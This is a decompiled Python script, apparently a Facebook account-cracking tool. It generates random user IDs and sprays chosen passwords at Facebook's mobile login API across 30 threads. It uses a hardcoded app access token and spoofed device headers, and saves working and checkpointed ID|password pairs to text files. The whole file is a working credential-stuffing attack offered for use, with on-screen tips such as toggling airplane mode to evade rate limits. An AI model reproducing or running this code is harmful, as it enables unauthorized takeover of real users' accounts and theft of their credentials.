# Decompile by Mateen (Tools By Abdul-Mateen)
# Time Succes decompile : 2022-03-15 19:41:54.557141
import os
try:
	import requests
except ImportError:
	print("\n [!] \033[0;91mmodule requests belum terinstall \033[0;97m")
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] \033[0;91mmodule futures belum terinstall\033[0;97m")
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		self.ips = requests.get("https://github.com/Shuvo-BBHH/old/blob/main/ments.txt").text
		os.system("clear")
		os.system('xdg-open https://m.facebook.com/mahdihasan.80')
		print(" ")
		print(" ")
		print("""\033[1;80m.88b  d88.  .d8b.  db   db d8888b. d888888b\n88'YbdP`88 d8' `8b 88   88 88  `8D   `88'\n\033[0;91m88  88  88 88ooo88 88ooo88 88   88    88\n88  88  88 88~~~88 88~~~88 88   88    88\n\033[0;9m88  88  88 88   88 88   88 88  .8D   .88.\n\033[0;97YP  YP  YP YP   YP YP   YP Y8888D' Y888888P                                             
\033[0m================================================================
CREATED BY MAHDI HASAN(SHUVO)
FB ; https://web.facebook.com/mahdi80808
FB Grup ;https://web.facebook.com/groups/610487559129086
================================================================
""")
		print("\n    \033[0;92m            UID CLONING \033[0;97m ")
		print("\n    \033[0;92m[A]\033[0;97m CRACK RANDOM ACOUNT 2009 \033[0;97m ")
		tanya = input("    \033[0;91m(#)\033[0;97m CHOOSE : ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["A", "a"]:
			self.fbtua()
		else:
			Main()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input("    \033[0;91m[+]\033[0;97m TOTAL IDS TO CRACK (LIMIT 5000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("    \033[0;91m[+]\033[0;97m TOTAL ID  \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n    \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,12345678")
				listpass = input("    \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
				if len(listpass)<=5:
					exit("\n    \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
				print("    \033[0;91m[*]\033[0;97m PASSWARD START CRACK  [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n    \033[0;91m[+]\033[0;97m ACOUNT OK SAVE  ok.txt")
				print("    \033[0;91m[+]\033[0;97m ACOUNT CP SAVE  cp.txt")
				print("    \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r    \033[0;91m[#] CRACK: %s/%s OK:-%s  CP:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;91m   [MADMI_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [MAMDI_CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
		print("\n [*] Author    :  ")
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/ ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/ ")
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))
